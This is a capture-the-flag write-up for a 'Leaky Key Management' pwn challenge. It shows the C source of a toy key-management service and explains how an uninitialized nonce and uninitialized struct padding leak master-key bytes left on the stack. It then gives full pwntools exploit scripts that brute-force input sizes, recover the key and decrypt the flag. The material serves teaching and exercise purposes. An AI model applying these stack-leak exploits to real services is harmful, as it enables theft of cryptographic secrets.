# Leaky Key Management &mdash; Solution
The challenge is a C binary implementing a simple key management service. The `test_kms` function creates a new 16-byte key, encrypts the user-provided data with the new key, and [wraps](https://cloud.google.com/kms/docs/key-wrapping) the new key with the `MASTER_KEY`. When first started, the program runs the `test_kms` function with the flag value as input.
```c
// Running on Ubuntu 18.04
// gcc -o chall chall.c -lcrypto

#include <assert.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <openssl/evp.h>
#include <openssl/rand.h>

struct wrapped_key {
  char type;
  int64_t nonce;
  unsigned char ciphertext[16];
};

const int WK_SIZE = sizeof(struct wrapped_key);
const int WK_HEX_SIZE = 2*sizeof(struct wrapped_key)+1;

void to_hex(const unsigned char* in, int in_len, char* out, int out_len) {
  assert(2*in_len+1 == out_len);
  for (int i = 0; i < in_len; i++) {
    sprintf(out + i * 2, "%02x", in[i]);
  }
  out[out_len-1] = 0;
}

void from_hex(const char* in, int in_len, unsigned char* out, int out_len) {
  assert(2*out_len+1 == in_len);
  for (int i = 0; i < out_len; i++) {
    int temp;
    sscanf(in + i * 2, "%02x", &temp);
    out[i] = temp;
  }
}

void wk_to_hex(const struct wrapped_key* wk, char* out, int out_len) {
  to_hex((const unsigned char*)wk, sizeof(*wk), out, out_len);
}

void wk_from_hex(const char* in, int in_len, struct wrapped_key* wk) {
  from_hex(in, in_len, (unsigned char*)wk, sizeof(*wk));
}

void encdec(const unsigned char* data, int data_len, unsigned char* key, int64_t nonce, unsigned char* out) {
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  unsigned char iv[16] = {0};
  memcpy(iv, &nonce, sizeof(nonce));
  int outlen = 0;
  EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), NULL, key, iv);
  EVP_EncryptUpdate(ctx, out, &outlen, data, data_len);
  EVP_CIPHER_CTX_free(ctx);
}

unsigned char MASTER_KEY[16];

void init_master_key() {
  RAND_bytes(MASTER_KEY, sizeof MASTER_KEY);
}

struct wrapped_key new_key() {
  struct wrapped_key wk;
  unsigned char key[16];
  wk.type = 'A';
  RAND_bytes((unsigned char*)&wk.nonce, sizeof wk.nonce);
  RAND_bytes(key, sizeof key);
  encdec(key, 16, MASTER_KEY, wk.nonce, wk.ciphertext);
  return wk;
}

void encdec_with_wrapped_key(const struct wrapped_key* wk, int64_t nonce, const unsigned char* data, int data_len, unsigned char* out) {
  unsigned char key[16];
  unsigned char master_key[16];
  memcpy(master_key, MASTER_KEY, sizeof MASTER_KEY);
  encdec(wk->ciphertext, 16, MASTER_KEY, wk->nonce, key);
  encdec(data, data_len, key, nonce, out);
}

void test_kms(const char *data, int data_len, int verbose) {
  unsigned char ciphertext[data_len];
  struct wrapped_key wk = new_key();
  int64_t nonce;
  encdec_with_wrapped_key(&wk, nonce, data, data_len, ciphertext);
  if (verbose) {
    char ciphertext_hex[2*data_len+1];
    to_hex(ciphertext, data_len, ciphertext_hex, 2*data_len+1);
    char wk_hex[WK_HEX_SIZE];
    wk_to_hex(&wk, wk_hex, WK_HEX_SIZE);
    printf("Wrapped key: %s\n", wk_hex);
    printf("Nonce: %016lx\n", nonce);
    printf("Ciphertext: %s\n", ciphertext_hex);
  }
}

void dump_flag() {
  FILE *f = fopen("flag.txt", "r");
  assert(f);
  char flag[128];
  fgets(flag, sizeof flag, f);
  int len = strlen(flag);
  test_kms(flag, len, 1);
}

void demo() {
  char buf[1025];
  init_master_key();
  dump_flag();
  while (1) {
    printf("Data to encrypt (max 1024 hex chars) > ");
    if (scanf("%1024s", buf) != 1)
      break ;
    int verbose;
    printf("Verbose output (0 or 1) > ");
    if (scanf("%d", &verbose) != 1)
      break ;
    int len = strlen(buf);
    int data_len = len / 2;
    unsigned char data[data_len];
    from_hex(buf, len+1, data, data_len);
    test_kms(data, data_len, verbose);
  }
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  demo();
  return 0;
}
```

Given the challenge name, and the fact it's in the Pwn category, the assumption is that the key material can leak somehow through the interaction with the problem. Careful analysis reveals two issues:
- The first issue is an uninitialized local variable in `test_kms`. Because `nonce` is never set before use, it holds leftover stack contents.
- The second leak comes from the layout of the `struct wrapped_key`.
```c
struct wrapped_key {
  char type;
  int64_t nonce;
  unsigned char ciphertext[16];
};
```

On x86-64 `int64_t` has to be 8-byte aligned. After the single-byte `type` field, the compiler therefore inserts 7 bytes of padding before the `nonce` field. Those padding bytes are never initialized in `new_key()`.

Hence, `test_kms` will leak 7 stack bytes in the wrapped key and 8 stack bytes in the nonce. If we play our cards right, these might contain bytes of the `MASTER_KEY`.

This brings us to how `encdec_with_wrapped_key` handles the master key. It is copied over to the local variable (and unused by the mistake of the challenge author), and will remain on the stack after the function returns.
```c
void encdec_with_wrapped_key(const struct wrapped_key* wk, int64_t nonce, const unsigned char* data, int data_len, unsigned char* out) {
  unsigned char key[16];
  unsigned char master_key[16];                 // ← stack buffer
  memcpy(master_key, MASTER_KEY, sizeof MASTER_KEY);
  encdec(wk->ciphertext, 16, MASTER_KEY, wk->nonce, key);
  encdec(data, data_len, key, nonce, out);
}
```

Now, we need to make sure that stack bytes containing the `master_key` somehow get reused by the local variable `nonce` or the padding of the `struct wrapped_key` in the next invocation of `test_kms`, without being overwritten in the meantime.

The final piece of the puzzle are the variable length arrays `unsigned char data[data_len]` in function `demo` and `unsigned char ciphertext[data_len]` in function `test_kms`. These are stack allocated and their sizes depends on the length of the user-provided data to encrypt. By submitting inputs of carefully chosen lengths we can influence which part of the previous stack frame ends up reused for nonce or lands in the 7-byte padding of struct `wrapped_key`.

What remains is to find the right input lengths to trigger the leaks. Instead of performing *Stack Feng Shui* manually, the model solution simply brute-forces the input lengths locally -- we use the debugger to set the `MASTER_KEY` bytes to a known value and try many possible pairs of inputs, until we see the desired bytes in the output.

```python
#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])

p = process('./chall')

gdb.attach(p, '''
    set {unsigned long long}(&MASTER_KEY) = 0xbabadedadeadbeef
    # set {unsigned long long}((void*)&MASTER_KEY+0x8) = 0xbabadedadeadbeef
    continue
''')

def check(p, la, lb):
    p.sendlineafter(b'> ',b'a'*la)
    p.sendlineafter(b'> ', b'0')
    p.sendlineafter(b'> ',b'a'*lb)
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Wrapped key: ')
    wrapped = p.recvline().strip().decode()
    p.recvuntil(b'Nonce: ')
    nonce = p.recvline().strip().decode()
    p.recvuntil(b'Ciphertext: ')
    ciphertext = p.recvline().strip().decode()
    P = 'babadedadeadbeef'
    for i in range(7):
        x = P[i*2+2:i*2+4] + P[i*2:i*2+2]
        if x in wrapped or x in nonce:
            print(f'Found: {la} {lb} {wrapped} {nonce}')
            return wrapped[2:16], nonce
    return wrapped[2:16], nonce

p.recvuntil(b'Wrapped key: ')
wrapped = p.recvline().strip().decode()
p.recvuntil(b'Nonce: ')
nonce = p.recvline().strip().decode()
p.recvuntil(b'Ciphertext: ')
ciphertext = p.recvline().strip().decode()

for i in range(0x100, 0x120, 0x2):
   for j in range(0x50, 0x400 ,0x2):
       check(p, i, j)

p.interactive()
```

Running the script quickly reveals the input sizes that leak 7 of the first 8 bytes of the master key via the struct padding.
```bash
# python3 brute.py
[+] Starting local process './chall': pid 83
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '83', '-x', '/tmp/pwnmlkt0ny4.gdb']
[+] Waiting for debugger: Done
Found: 256 194 41beaddedadebaba62338b102b2c38fae37ed7683fa155ee09bd0370dba02b1d 0000000000000000
Found: 256 196 41beaddedadebabab13a29b6527eedb01b3354c15b4ae2a2738935c17c00cbb2 0000000000000000
Found: 256 198 41beaddedadebaba596603562c21cb705c87f2a6bf24ec3dbd105f7aa94e0f68 0000000000000000
Found: 256 200 41beaddedadebaba80b908963f4e0e0f1f50e28fc65d29c883a298dbfc0585af 0000000000000000
Found: 256 202 41beaddedadebaba9b3b66ece97472b8d2f3a4ec5e4999e3d56fe3d9ce5dbb3a 0000000000000000
...
```

The other 8 bytes of the key can never leak via the struct padding of the wrapped key due to [x86-64 ABI stack alignment](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment), but they can leak via the nonce. Modifying the above script to change the second 8 bytes of the key gives us the needed input sizes.
```bash
# python3 brute.py
[+] Starting local process './chall': pid 103
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '103', '-x', '/tmp/pwna308ie5j.gdb']
[+] Waiting for debugger: Done
Found: 256 498 417a7462fe7f00005d884c59adf808c4dedac71dc6c2268d49240ca9f2ff4aba e94c66a2443fee5c
Found: 256 708 41000000000000003c8673af578b3ff2ef3a0ce00585310bd2d8064537aed240 babadedadeadbeef
Found: 256 710 4100000000000000e07e413b8054221936b66290b959802acbeb66343d66591e babadedadeadbeef
Found: 256 712 4100000000000000f2e5f5c136f1ca8b558fbb2023aac2fa03a9655c4ee4d027 babadedadeadbeef
Found: 256 714 4100000000000000ecc167d29b3acb2037f06b8c29636a1fb617b7db09168694 babadedadeadbeef
...
```

Now the rest is straightforward, we brute-force the missing byte and decrypt the flag.

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *
from Crypto.Cipher import AES

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 31387)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            # set {unsigned long long}(&MASTER_KEY) = 0xbabadedadeadbeef
            # set {unsigned long long}((void*)&MASTER_KEY+0x8) = 0xbabadedadeadbeef
            continue
        ''')
    return p

def check(p, la, lb):
    p.sendlineafter(b'> ',b'a'*la)
    p.sendlineafter(b'> ', b'0')
    p.sendlineafter(b'> ',b'a'*lb)
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Wrapped key: ')
    wrapped = p.recvline().strip().decode()
    p.recvuntil(b'Nonce: ')
    nonce = p.recvline().strip().decode()
    p.recvuntil(b'Ciphertext: ')
    ciphertext = p.recvline().strip().decode()
    leak = wrapped[2:16]
    P = 'babadedadeadbeef'
    for i in range(7):
        x = P[i*2+2:i*2+4] + P[i*2:i*2+2]
        if x in wrapped or x in nonce:
            print(f'Found: {la} {lb} {wrapped} {nonce}')
            return wrapped[2:16], nonce
    return wrapped[2:16], nonce

def unwrap(master_key, wrapped, ciphertext, nonce):
    anonce = unpack(wrapped[8:16])
    cipher = AES.new(master_key, AES.MODE_CTR, nonce=wrapped[8:16])
    key = cipher.decrypt(wrapped[16:32])
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    plaintext = cipher.decrypt(ciphertext)
    if b'FortID' in plaintext:
        print(f'Plaintext: {plaintext}')

p = conn()

p.recvuntil(b'Wrapped key: ')
wrapped = p.recvline().strip().decode()
p.recvuntil(b'Nonce: ')
nonce = p.recvline().strip().decode()
p.recvuntil(b'Ciphertext: ')
ciphertext = p.recvline().strip().decode()

# for i in range(0x100, 0x120, 0x2):
#     for j in range(0x50, 0x400 ,0x2):
#         check(p, i, j)

key_8_16_hex = check(p, 256, 706)[1]
key_0_7_hex = check(p, 256, 194)[0]
print(f'key_0_7_hex: {key_0_7_hex}')
print(f'key_8_16_hex: {key_8_16_hex}')

key_0_7 = bytes.fromhex(key_0_7_hex)
key_8_16 = bytes.fromhex(key_8_16_hex)[::-1]

print('wrapped:', wrapped)
print('ciphertext:', ciphertext)
for f in range(256):
    master_key = bytes([f]) + key_0_7 + key_8_16
    unwrap(master_key, bytes.fromhex(wrapped), bytes.fromhex(ciphertext), bytes.fromhex(nonce)[::-1])

p.interactive()
```
